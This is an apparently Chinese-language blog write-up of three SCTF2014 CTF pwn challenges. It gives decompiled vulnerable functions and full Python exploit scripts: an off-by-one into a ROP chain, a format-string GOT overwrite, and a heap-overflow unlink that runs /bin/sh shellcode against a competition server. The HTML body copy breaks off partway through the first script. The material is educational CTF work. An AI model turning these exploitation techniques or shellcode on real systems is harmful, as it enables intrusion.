@@ -1,0 +1,696 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Eadom&#39;s Blog">
+    <title>SCTF2014之PWN部分writeup - Eadom&#39;s Blog</title>
+    <meta name="author" content="Eadom">
+    
+    
+        <link rel="icon" href="https://blog.eadom.net/assets/images/avatar.jpg">
+    
+    
+        
+            <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
+        
+    
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Eadom","sameAs":["https://github.com/eadom","https://www.linkedin.com/in/yukunliu/","http://weibo.com/onetpig","https://twitter.com/Yufan_L"],"image":"avatar.jpg"},"articleBody":"PWN200漏洞分析123pwn200: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILENo RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   pwn200\n只启用了NX 接下来分析程序，程序很简单\n123456789101112131415161718192021222324252627282930ssize\\_t \\_\\_cdecl sub_80484AC()&#123;  ssize_t result; // eax@3  char v1; // \\[sp+1Ch\\] \\[bp-9Ch\\]@1  int buf; // \\[sp+9Ch\\] \\[bp-1Ch\\]@1  int v3; // \\[sp+A0h\\] \\[bp-18h\\]@1  int v4; // \\[sp+A4h\\] \\[bp-14h\\]@1  int v5; // \\[sp+A8h\\] \\[bp-10h\\]@1  size_t n; // \\[sp+ACh\\] \\[bp-Ch\\]@1  n = 16;  buf = 0;  v3 = 0;  v4 = 0;  v5 = 0;  memset(&amp;v1, 0, 0x80u);  write(1, \"input name:\", 12u);  read(0, &amp;buf, n + 1);         //读取17个字符到buf，存在一个字节的溢出，修改n的值  if ( strlen((const char *)&amp;buf) - 1 &gt; 9 || strncmp(\"syclover\", (const char *)&amp;buf, 8u) )  &#123;    result = -1;  &#125;  else  &#123;    write(1, \"input slogan:\", 14u);    read(0, &amp;v1, n);        //n值被修改后溢出v1    result = write(1, &amp;v1, n);  &#125;  return result;&#125;\n程序在read到buf时多读了一个字符，导致溢出修改n的值，之后read到v1时导致溢出控制程序流程。\n漏洞利用第一步先写入”sycloverx00x00123456xef”，其中xef就是覆盖变量n的字节。 之后程序调用read(0, &amp;v1, n);时就可以读入payload 因为NX，所以采用ROP链执行。 题目提供了glibc.so，所以思路是先读取plt中__libc_start_main的地址，通过提供的glibc.so获取到system和__libc_start_main的偏移差计算出system的位置。\n0003f430  w   DF .text 0000008d  GLIBC_2.0   system000193e0 g    DF .text  000001c2  GLIBC_2.0   __libc_start_main\n地址偏移为 0x26050 之后将其写入.plt中__libc_start_main的位置。最后通过执行.got中__libc_start_main并置入参数sh来执行system(“sh”)获得shell。 exploit如下\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667'''SCTF2014 pwn200 expyuf4n'''from zio import *import structwrite_got = l32(0x080483A0)read_got = l32(0x08048360)lib\\_main\\_got = l32(0x08048390)lib\\_main\\_plt = l32(0x0804985C)ppppr = l32(0x08048645)pppr = l32(0x08048646)ppr = l32(0x080485bf)\\# io = zio('./pwn200',print_write=COLORED(REPR))io = zio(('218.2.197.248',10001),print_write=COLORED(REPR))payload0 = ''payload0 += 'sycloverx00x00123456'+'xef' # second write lenpayload1 = ''\\# second write\\# junkpayload1 += '1' * 0x9c\\# ebppayload1 += '2345'\\# eip call writepayload1 += write_got\\# ppprpayload1 += pppr\\# write argspayload1 += l32(0x1)payload1 += lib\\_main\\_pltpayload1 += l32(0x04)\\# read modify libmainpltpayload1 += read_got\\# ppprpayload1 += pppr\\# argspayload1 += l32(0x0)payload1 += lib\\_main\\_pltpayload1 += l32(0x08) \\# lib_main(system)payload1 += lib\\_main\\_gotpayload1 += '1111'payload1 += l32(0x0804985C+0x4)\\# print len(payload1)io.read_until('input name:')io.write(payload0)io.read_until('input slogan:')io.write(payload1)buf = io.sock.recv(1024)lib\\_main\\_add = struct.unpack('&lt;I',buf\\[-4:\\])\\[0\\]system\\_add = lib\\_main_add + 0x26050print hex(lib\\_main\\_add)\\# io.gdb_hint()payload2 = l32(system_add)payload2 += 'shx00x00'io.write(payload2+'n')io.interact()\nflag SCTF{SH3NG_4_KAN_DAN__BU_FU_9_GANN}\nPWN300123pwn300: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILENo RELRO        Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   pwn300\n题目也提供了glibc，而且pwn200进去以后发现三题都在一个服务器上。所以目测利用方法应该相似。\n漏洞分析在第三个功能显示message发现一个格式化溢出漏洞\n123456789101112131415int \\_\\_cdecl fun3\\_sub_80487FA()&#123;  int result; // eax@1  char dest; // \\[sp+1Ch\\] \\[bp-40Ch\\]@1  int v2; // \\[sp+41Ch\\] \\[bp-Ch\\]@1  v2 = *MK\\_FP(\\_\\_GS__, 20);  strcpy(&amp;dest, src);  printf(\"Your message is:\");  printf(src);                                  // exploit  result = *MK\\_FP(\\_\\_GS__, 20) ^ v2;  if ( *MK\\_FP(\\_\\_GS__, 20) != v2 )    \\_\\_stack\\_chk_fail();  return result;&#125;\n而且之前还很配合的把src的内容复制到栈里。。。这样就有机会对任意地址进行修改\n漏洞利用利用格式化溢出漏洞可以对内存读取写入，所以可以利用pwn200的利用方式：读取PLT中__libc_main_start的地址，通过libc.so计算system的地址写入程序之后可能会用到的函数的GOT 通过调试发现输入buf的起点位于printf调用的第七个变量 读取.plt __libc_main_start的payload ‘x28x91x04x08%7$sn’ 接下来找一个接下来可能调用到的函数修改其PLT为system函数的地址。这个函数最好可以把“sh”作为参数放进去。于是我选择了memset函数 他在第二个功能中被用到，而且正好把src当参数调用，这样我们通过留言功能让src为”sh”就能调用system(“sh”)了。\n123456int \\_\\_cdecl fun2\\_sub_80487B6()&#123;  puts(\"input your message\");  memset(src, 0, 0x400u);  return readbuf\\_sub\\_804866D((int)src, 1024);&#125;\n下面是exploit，修改地址的时候利用了libformatstr库\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950'''SCTF2014 pwn300 exploityuf4n'''from libformatstr import *from zio import *import struct\\# io = zio('./pwn300',print_write=COLORED(REPR))io = zio(('218.2.197.248',10002),print_write=COLORED(REPR))memset\\_plt\\_addr = 0x08049130p = FormatStr()payload\\_leak\\_lib_main = 'x28x91x04x08%7$sn'\\# read \\_\\_lib\\_main_start pltio.read_until('your choice:')io.write('2n')io.read_until('your message')io.write(payload\\_leak\\_lib_main)io.read_until('your choice:')io.write('3n')io.read_until('message is:')buf = io.read(8)buf = buf\\[-4:\\]systemaddr = struct.unpack('&lt;I',buf)\\[0\\] + 0x26050print 'SYSADDR',hex(systemaddr)\\# write  memset_pltp\\[memset\\_plt\\_addr\\] = systemaddrpayload = p.payload(7, start_len=0) + 'n'\\# io.gdb_hint()io.read_until('your choice:')io.write('2n')io.read_until('your message')io.write(payload)io.write('3n')\\# set src=sh and call memsetio.read_until('your choice:')io.write('2n')io.read_until('message')io.write('shn')io.read_until('your choice:')io.write('2n')io.read_until('message')io.write('shn')io.interact()\nflag SCTF{ZQzq2617}\nPWN400123pwn400: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILENo RELRO        Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   pwn400\n这个NX都没有。\n漏洞分析程序是一个类似便签的功能。 每个note是用malloc申请的，用双向链表链接起来，目测是某个同学的C语言小作业吧。。 3号功能可以显示note空间的的首地址。 在4号功能修改note的功能发现一个堆溢出的漏洞\n12345678910111213141516171819202122232425262728293031323334353637int \\_\\_cdecl fun4\\_sub_8048D09(int a1)&#123;  size_t v1; // eax@4  int result; // eax@8  int v3; // \\[sp+28h\\] \\[bp-410h\\]@1  char buf; // \\[sp+2Ch\\] \\[bp-40Ch\\]@1  int v5; // \\[sp+42Ch\\] \\[bp-Ch\\]@1  v5 = *MK\\_FP(\\_\\_GS__, 20);  memset(&amp;buf, 0, 0x400u);  v3 = a1;  if ( a1 )  &#123;    write(1, \"note title:\", 0xBu);    read(0, &amp;buf, 0x400u);    while ( v3 )    &#123;      v1 = strlen(&amp;buf);      if ( !strncmp(&amp;buf, (const char *)(v3 + 12), v1) )        break;      v3 = *(_DWORD *)(v3 + 8);    &#125;    write(1, \"input content:\", 0xEu);    read(0, &amp;buf, 0x400u);    strcpy((char *)(v3 + 108), &amp;buf);           // exploit    write(1, \"succeed!\", 8u);    puts((const char *)(v3 + 108));  &#125;  else  &#123;    write(1, \"no notes\", 8u);  &#125;  result = *MK\\_FP(\\_\\_GS__, 20) ^ v5;  if ( *MK\\_FP(\\_\\_GS__, 20) != v5 )    \\_\\_stack\\_chk_fail();  return result;&#125;\n在5号功能删除note的功能发现一个类似dwrod shoot的漏洞\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253int \\_\\_cdecl sub\\_8048E99(int a1)&#123;  int v1; // ST28_4@8  int v2; // ST2C_4@8  int result; // eax@10  __int32 ptr; // \\[sp+24h\\] \\[bp-24h\\]@3  int buf; // \\[sp+32h\\] \\[bp-16h\\]@1  int v6; // \\[sp+36h\\] \\[bp-12h\\]@1  __int16 v7; // \\[sp+3Ah\\] \\[bp-Eh\\]@1  int v8; // \\[sp+3Ch\\] \\[bp-Ch\\]@1  v8 = *MK\\_FP(\\_\\_GS__, 20);  buf = 0;  v6 = 0;  v7 = 0;  if ( *(_DWORD *)a1 )  &#123;    write(1, \"note location:\", 0xEu);    read(0, &amp;buf, 8u);    ptr = strtol((const char *)&amp;buf, 0, 16);    if ( *(_DWORD *)ptr == ptr )    &#123;      if ( *(_DWORD *)a1 == ptr )      &#123;        *(\\_DWORD *)a1 = *(\\_DWORD *)(*(_DWORD *)a1 + 8);      &#125;      else      &#123;        if ( *(_DWORD *)(ptr + 8) )        &#123;          v1 = *(_DWORD *)(ptr + 8);          v2 = *(_DWORD *)(ptr + 4);          *(_DWORD *)(v2 + 8) = v1;             // dword shoot          *(_DWORD *)(v1 + 4) = v2;        &#125;        else        &#123;          *(\\_DWORD *)(*(\\_DWORD *)(ptr + 4) + 8) = 0;        &#125;      &#125;      write(1, \"succeed!nn\", 0xAu);      free((void *)ptr);    &#125;  &#125;  else  &#123;    write(1, \"no notes\", 8u);  &#125;  result = *MK\\_FP(\\_\\_GS__, 20) ^ v8;  if ( *MK\\_FP(\\_\\_GS__, 20) != v8 )    \\_\\_stack\\_chk_fail();  return result;&#125;\n例如ptr = &amp;note (note空间的基地址) 则可以进行 [ [ptr+4]+8 ] = [prt+8] [ [ptr+8]+4 ] = [ptr+4]\n漏洞利用思路是通过堆溢出漏洞可以覆盖到另外一个note的ptr+4 和 ptr+8。 之后利用这个dword shoot修改即将要调用的函数的plt到shellcode处。 shellcode前面要加一些nop，因为dword shoot的副作用会修改到shellcode。 具体操作：\n\n新建3个note，我把shellcode放在第三个note的content里\n查看他们的地址\n溢出第一个note\n删除第二个note，通过dword shoot修改write函数的plt为shellcode位置（有试过修改其他函数的，发现修改write可以成功。）\n程序在dword shoot之后就有一个write调用，即进入shellcode\n\nexploit如下\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778'''SCTF2014 pwn400 exploityuf4n'''from zio import *import struct\\# io = zio('./pwn400', print_write=COLORED(REPR), timeout=80000)io = zio(('218.2.197.248',10003),print_write=COLORED(REPR))exit_plt = 0x0804A46Cfree_plt =0x0804A450write_plt =0x0804A478shellcode = \"x90\"*16+\"x31xc9xf7xe1xb0x0bx51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80\"io.read_until('option---&gt;&gt;')io.write('1n')io.read_until('note title:')io.write('1n')io.read_until('note type:')io.write('1n')io.read_until('note content:')io.write('1n')io.read_until('option---&gt;&gt;')io.write('1n')io.read_until('note title:')io.write('2n')io.read_until('note type:')io.write('2n')io.read_until('note content:')io.write('2n')io.read_until('option---&gt;&gt;')io.write('1n')io.read_until('note title:')io.write('3n')io.read_until('note type:')io.write('3n')io.read_until('note content:')io.write(shellcode+'n')io.read_until('option---&gt;&gt;')io.write('3n')io.read_until('note title:')io.write('3n')buf = io.read_until('option---&gt;&gt;')addr_3 = buf\\[buf.find('location:0x')+len('location:0x'):buf.find('location:0x')+len('location:0x')+8\\]io.write('3n')io.read_until('note title:')io.write('2n')buf = io.read_until('option---&gt;&gt;')addr_2 = buf\\[buf.find('location:0x')+len('location:0x'):buf.find('location:0x')+len('location:0x')+8\\]payload = '1'*0x100payload += '2222'\\# addr2payload += l32(int(addr_2,16))\\# ptr+4payload += l32(write_plt-0x8)\\# ptr+8payload += l32(int(addr_3,16)+108)payload += 'efghijklmn'io.write('4n')io.read_until('title:')io.write('1n')io.read_until('content:')io.write(payload+'n')io.read_until('option---&gt;&gt;')io.write('5n')\\# io.gdb_hint()io.read_until('location:')io.write(addr_2+'n')io.interact()\nflag SCTF{2318540E78446A0E84EF69685092F0C3}\n","dateCreated":"2014-12-08T16:13:56+08:00","dateModified":"2025-11-21T20:45:50+08:00","datePublished":"2014-12-08T16:13:56+08:00","description":"","headline":"SCTF2014之PWN部分writeup","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.eadom.net/writeups/sctf2014-pwn-writeups/"},"publisher":{"@type":"Organization","name":"Eadom","sameAs":["https://github.com/eadom","https://www.linkedin.com/in/yukunliu/","http://weibo.com/onetpig","https://twitter.com/Yufan_L"],"image":"avatar.jpg","logo":{"@type":"ImageObject","url":"avatar.jpg"}},"url":"https://blog.eadom.net/writeups/sctf2014-pwn-writeups/","keywords":"writeup, sctf"}</script>
+    <meta name="description" content="PWN200漏洞分析123pwn200: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26RELRO           STACK CANARY      NX            PIE">
+<meta name="keywords" content="writeup,sctf">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="SCTF2014之PWN部分writeup">
+<meta property="og:url" content="https://blog.eadom.net/writeups/sctf2014-pwn-writeups/index.html">
+<meta property="og:site_name" content="Eadom&#39;s Blog">
+<meta property="og:description" content="PWN200漏洞分析123pwn200: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26RELRO           STACK CANARY      NX            PIE">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2025-11-21T12:45:50.805Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SCTF2014之PWN部分writeup">
+<meta name="twitter:description" content="PWN200漏洞分析123pwn200: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26RELRO           STACK CANARY      NX            PIE">
+<meta name="twitter:creator" content="@Yufan_L">
+    
+    
+        
+    
+    
+        <meta property="og:image" content="https://blog.eadom.net/assets/images/avatar.jpg"/>
+    
+    
+    
+    
+    <!--STYLES-->
+    <link rel="stylesheet" href="/assets/css/style-sifsy9oex2dugunw1y6dni61b2yek7gdovchv6fh3t7csw6uv5ophjuqcfmz.min.css">
+    <!--STYLES END-->
+    
+
+    
+    <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?e2c34d89d7cd8c97b8b39f770eac6769";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+    </script>
+
+
+    
+        
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+    
+        
+            
+        
+    
+
+<header id="header" data-behavior="1">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a
+            class="header-title-link"
+            href="/"
+            aria-label=""
+        >
+            Eadom&#39;s Blog
+        </a>
+    </div>
+    
+        
+            <a
+                class="header-right-picture "
+                href="#about"
+                aria-label="Open the link: /#about"
+            >
+        
+        
+            <img class="header-picture" src="/assets/images/avatar.jpg" alt="Author&#39;s picture"/>
+        
+        </a>
+    
+</header>
+
+            <!-- Define author's picture -->
+
+
+
+        
+    
+
+<nav id="sidebar" data-behavior="1">
+    <div class="sidebar-container">
+        
+            <div class="sidebar-profile">
+                <a
+                    href="/#about"
+                    aria-label="Read more about the author"
+                >
+                    <img class="sidebar-profile-picture" src="/assets/images/avatar.jpg" alt="Author&#39;s picture"/>
+                </a>
+                <h4 class="sidebar-profile-name">Eadom</h4>
+                
+                    <h5 class="sidebar-profile-bio"><p>NO PWN NO FUN</p>
+</h5>
+                
+            </div>
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/"
+                            
+                            rel="noopener"
+                            title="Home"
+                        >
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Home</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-categories"
+                            
+                            rel="noopener"
+                            title="Categories"
+                        >
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Categories</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-tags"
+                            
+                            rel="noopener"
+                            title="Tags"
+                        >
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Tags</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-archives"
+                            
+                            rel="noopener"
+                            title="Archives"
+                        >
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Archives</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="#about"
+                            
+                            rel="noopener"
+                            title="About"
+                        >
+                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">About</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://github.com/eadom"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="GitHub"
+                        >
+                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">GitHub</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://www.linkedin.com/in/yukunliu/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="LinkedIn"
+                        >
+                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">LinkedIn</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="http://weibo.com/onetpig"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Weibo"
+                        >
+                        <i class="sidebar-button-icon fab fa-weibo" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Weibo</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://twitter.com/Yufan_L"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Twitter"
+                        >
+                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Twitter</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/atom.xml"
+                            
+                            rel="noopener"
+                            title="RSS"
+                        >
+                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">RSS</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+            <div id="main" data-behavior="1"
+                 class="
+                        hasCoverMetaIn
+                        ">
+                
+<article class="post">
+    
+    
+        <div class="post-header main-content-wrap text-left">
+    
+        <h1 class="post-title">
+            SCTF2014之PWN部分writeup
+        </h1>
+    
+    
+        <div class="post-meta">
+    <time datetime="2014-12-08T16:13:56+08:00">
+	
+		    Dec 08, 2014
+    	
+    </time>
+    
+        <span>in </span>
+        
+    <a class="category-link" href="/categories/writeups/">writeups</a>
+
+
+    
+</div>
+
+    
+</div>
+
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <h1 id="PWN200"><a href="#PWN200" class="headerlink" title="PWN200"></a>PWN200</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwn200: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE</span><br><span class="line">No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   pwn200</span><br></pre></td></tr></table></figure>
+<p>只启用了NX 接下来分析程序，程序很简单</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ssize\<span class="keyword">_t</span> \_\<span class="function">_cdecl <span class="title">sub_80484AC</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// eax@3</span></span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// \[sp+1Ch\] \[bp-9Ch\]@1</span></span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// \[sp+9Ch\] \[bp-1Ch\]@1</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// \[sp+A0h\] \[bp-18h\]@1</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// \[sp+A4h\] \[bp-14h\]@1</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// \[sp+A8h\] \[bp-10h\]@1</span></span><br><span class="line">  <span class="keyword">size_t</span> n; <span class="comment">// \[sp+ACh\] \[bp-Ch\]@1</span></span><br><span class="line"></span><br><span class="line">  n = <span class="number">16</span>;</span><br><span class="line">  buf = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v1, <span class="number">0</span>, <span class="number">0x80</span>u);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"input name:"</span>, <span class="number">12u</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, n + <span class="number">1</span>);         <span class="comment">//读取17个字符到buf，存在一个字节的溢出，修改n的值</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf) - <span class="number">1</span> &gt; <span class="number">9</span> || <span class="built_in">strncmp</span>(<span class="string">"syclover"</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf, <span class="number">8u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"input slogan:"</span>, <span class="number">14u</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;v1, n);        <span class="comment">//n值被修改后溢出v1</span></span><br><span class="line">    result = write(<span class="number">1</span>, &amp;v1, n);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>程序在read到buf时多读了一个字符，导致溢出修改n的值，之后read到v1时导致溢出控制程序流程。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>第一步先写入”sycloverx00x00123456xef”，其中xef就是覆盖变量n的字节。 之后程序调用read(0, &amp;v1, n);时就可以读入payload 因为NX，所以采用ROP链执行。 题目提供了glibc.so，所以思路是先读取plt中__libc_start_main的地址，通过提供的glibc.so获取到system和__libc_start_main的偏移差计算出system的位置。</p>
+<p>0003f430  w   DF .text 0000008d  GLIBC_2.0   system<br>000193e0 g    DF .text  000001c2  GLIBC_2.0   __libc_start_main</p>
+<p>地址偏移为 0x26050 之后将其写入.plt中__libc_start_main的位置。最后通过执行.got中__libc_start_main并置入参数sh来执行system(“sh”)获得shell。 exploit如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">SCTF2014 pwn200 exp</span></span><br><span class="line"><span class="string">yuf4n</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">write_got = l32(<span class="number">0x080483A0</span>)</span><br><span class="line">read_got = l32(<span class="number">0x08048360</span>)</span><br><span class="line">lib\_main\_got = l32(<span class="number">0x08048390</span>)</span><br><span class="line">lib\_main\_plt = l32(<span class="number">0x0804985C</span>)</span><br><span class="line">ppppr = l32(<span class="number">0x08048645</span>)</span><br><span class="line">pppr = l32(<span class="number">0x08048646</span>)</span><br><span class="line">ppr = l32(<span class="number">0x080485bf</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment"># io = zio('./pwn200',print_write=COLORED(REPR))</span></span><br><span class="line">io = zio((<span class="string">'218.2.197.248'</span>,<span class="number">10001</span>),print_write=COLORED(REPR))</span><br><span class="line"></span><br><span class="line">payload0 = <span class="string">''</span></span><br><span class="line">payload0 += <span class="string">'sycloverx00x00123456'</span>+<span class="string">'xef'</span> <span class="comment"># second write len</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">''</span></span><br><span class="line">\<span class="comment"># second write</span></span><br><span class="line">\<span class="comment"># junk</span></span><br><span class="line">payload1 += <span class="string">'1'</span> * <span class="number">0x9c</span></span><br><span class="line">\<span class="comment"># ebp</span></span><br><span class="line">payload1 += <span class="string">'2345'</span></span><br><span class="line">\<span class="comment"># eip call write</span></span><br><span class="line">payload1 += write_got</span><br><span class="line">\<span class="comment"># pppr</span></span><br><span class="line">payload1 += pppr</span><br><span class="line">\<span class="comment"># write args</span></span><br><span class="line">payload1 += l32(<span class="number">0x1</span>)</span><br><span class="line">payload1 += lib\_main\_plt</span><br><span class="line">payload1 += l32(<span class="number">0x04</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment"># read modify libmainplt</span></span><br><span class="line">payload1 += read_got</span><br><span class="line">\<span class="comment"># pppr</span></span><br><span class="line">payload1 += pppr</span><br><span class="line">\<span class="comment"># args</span></span><br><span class="line">payload1 += l32(<span 